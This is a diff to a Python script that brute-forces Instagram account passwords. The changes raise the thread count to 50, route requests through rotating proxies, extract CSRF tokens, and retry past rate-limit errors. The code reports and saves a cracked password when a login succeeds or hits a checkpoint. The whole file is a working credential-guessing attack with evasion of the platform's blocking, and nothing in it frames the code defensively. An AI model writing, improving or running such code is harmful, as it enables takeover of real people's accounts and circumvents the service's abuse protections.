@@ -8,13 +8,15 @@ import threading
 import traceback
 import re
 from urllib.error import HTTPError
+import sys
+import os
 
 try:
     import Queue
 except ImportError:
     import queue as Queue
 
-THREAD = 15
+THREAD = 50
 
 
 
@@ -53,6 +55,10 @@ def extract_csrf_token(text):
 
 
 def craft_response(username, password, csrf_token, proxy):
+
+  #if q.empty() and found_flag:
+    #return
+
 
   user_agents = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)",
@@ -117,78 +123,78 @@ def craft_response(username, password, csrf_token, proxy):
 
 
 
-    page_text = str(the_page)
+      page_text = str(the_page)
 
-    if "\"authenticated\": true" in page_text:
+      if "\"authenticated\": true" in page_text:
 
-      print(bcolors.OKGREEN + "[+] Success! Password is: " + bcolors.BOLD + password + bcolors.ENDC + "\n")
+        print(bcolors.OKGREEN + "[+] Success! Password is: " + bcolors.BOLD + password + bcolors.ENDC + "\n")
 
-      f = open("success_login.txt", "w")
-      found_flag = True
-      f.write(password)
+        f = open("success_login.txt", "w")
+        found_flag = True
+        f.write(password)
 
-      q.queue.clear()
-      q.task_done()
-      return
+        q.queue.clear()
+        q.task_done()
+        return
 
-    elif "error" in page_text:
-      # send response again
-      print ("Error in page text.." + password)
-      craft_response(username, password, csrf_token, random.choice(list(proxys_working_list.keys())))
+      elif "error" in page_text:
+        # send response again
+        #print ("Error in page text.." + password)
+        #maybe put raise Exception here?
+        #craft_response(username, password, csrf_token, random.choice(list(proxys_working_list.keys())))
 
+        print("error in page_text")
+        raise Exception("500")
 
-    else:
-      print ("Trying: " + "\"" + password + "\"" +"| FAILURE")
+      else:
+        print ("Trying: " + "\"" + password + "\"" +"| FAILURE")
 
     
   except HTTPError as e:
-          if e.getcode() == 400 or e.getcode() == 403:
+    if e.getcode() == 400 or e.getcode() == 403:
 
-              #print (str(e.read().decode("utf8", 'ignore')))
+        if "checkpoint_required" in e.read().decode("utf8", 'ignore'):
+          print(bcolors.OKGREEN + bcolors.BOLD + "\n[*]Successful Login "
+                  + bcolors.FAIL + "But need Checkpoint :|" + bcolors.OKGREEN)
+          print("---------------------------------------------------")
+          print("[!]Username: ", USER)
+          print("[!]Password: ", password)
+          print("---------------------------------------------------\n" + bcolors.ENDC)
+          found_flag = True
+          q.queue.clear()
+          q.task_done()
+          os._exit(1)
+          return
 
-              #j = open("400_error.txt", "w")
-              #j.write(str(e.read().decode("utf8", 'ignore')))
-              #j.close()
+        elif proxy:
+            print(bcolors.WARNING +
+                  "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
+                  + bcolors.ENDC
+                  )
+            if proxy in proxys_working_list:
+                proxys_working_list.pop(proxy)
 
-              if "checkpoint_required" in e.read().decode("utf8", 'ignore'):
-                print(bcolors.OKGREEN + bcolors.BOLD + "\n[*]Successful Login "
-                        + bcolors.FAIL + "But need Checkpoint :|" + bcolors.OKGREEN)
-                print("---------------------------------------------------")
-                print("[!]Username: ", USER)
-                print("[!]Password: ", password)
-                print("---------------------------------------------------\n" + bcolors.ENDC)
-                found_flag = True
-                q.queue.clear()
-                q.task_done()
-                return
-
-              elif proxy:
-                  print(bcolors.WARNING +
-                        "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
-                        + bcolors.ENDC
-                        )
-                  if proxy in proxys_working_list:
-                      proxys_working_list.pop(proxy)
-
-                  print(bcolors.OKGREEN + "[+] Online Proxy: ", str(len(proxys_working_list)) + bcolors.ENDC)
-                  raise Exception(str(e.getcode()))
-                  
+            print(bcolors.OKGREEN + "[+] Online Proxy: ", str(len(proxys_working_list)) + bcolors.ENDC)
+            raise Exception(str(e.getcode()))
+            
 
 
-              else:
-                  print(bcolors.FAIL + "[!]Error : Your Ip is now on Instagram jail ,"
-                        " script will not work fine until you change your ip or use proxy" + bcolors.ENDC)
-                  raise Exception(str(e.getcode()))
-          else:
-              #print("Error:", e.getcode())
-              print ("Http Error Bloc: " + str(e.getcode()))
-              raise Exception(str(e.getcode()))
+        else:
+            print(bcolors.FAIL + "[!]Error : Your Ip is now on Instagram jail ,"
+                  " script will not work fine until you change your ip or use proxy" + bcolors.ENDC)
+            raise Exception(str(e.getcode()))
+    else:
+        #print("Error:", e.getcode())
+        #print ("Http Error Bloc: " + str(e.getcode()))
+
+        #This is causing a double exception -- raising an exception inside an exception!!
+        raise Exception(str(e.getcode()))
 
         
     
   except Exception as err:
-    print ("LINE 194: " + str(err))
-    raise Exception(str(e.getcode()))
+    #print ("LINE 194: " + str(err))
+    raise Exception(str(err))
     
     
 
@@ -292,8 +298,9 @@ def check_proxy(q):
 def has_server_error(message):
 
   if (("403" in message) or ("429" in message) or ("onnection reset" in message)
-            or ("50" in message) or ("timed out" in message)\
-            or ("Remote end closed connection" in message)):
+            or ("50" in message) or ("timed out" in message) or ("30" in message)\
+            or ("Remote end closed connection" in message) or ("violation of protocol" in message))\
+            or ("400" in message) or ("403" in message):
     return True
 
   else:
@@ -328,13 +335,15 @@ def brute(q):
 
           #Forbidden or Too Many Requests, try again until request is accepted
 
-          print(bcolors.WARNING + "[-] Error, retrying.. " + str(error) + bcolors.ENDC)
+          #print(bcolors.WARNING + "[-] Error, retrying.. " + str(error) + bcolors.ENDC)
 
           # Look for server side error codes
+          """
           if ("400" in message) or ("403" in message):
-            print ("400 Error, password is: " + word)
-            print (message)
+            #print ("400 Error, password is: " + word)
+            #print (message)
             craft_response(username, word, csrf_token, random.choice(list(proxys_working_list.keys())))
+          """
 
 
           i = 1
@@ -357,6 +366,7 @@ def brute(q):
               message = str(e)
               #print ("TEST: " + message)
               #return 0
+          print("Client side error: " + message)
             
 
         
@@ -409,8 +419,14 @@ def get_csrf():
 
   #Keep making requests until a csrf token is acquired 
   print(bcolors.WARNING + "[-] Extracting CSRF Token...\n" + bcolors.ENDC)
+
   while len(csrf_token) == 0:
     try:
+
+
+      proxy_support = rq.ProxyHandler({'https': 'https://' + random.choice(list(proxys_working_list.keys()))})
+      opener = rq.build_opener(proxy_support)
+      rq.install_opener(opener)
 
       response = rq.urlopen('http://www.instagram.com')
       html = response.read()
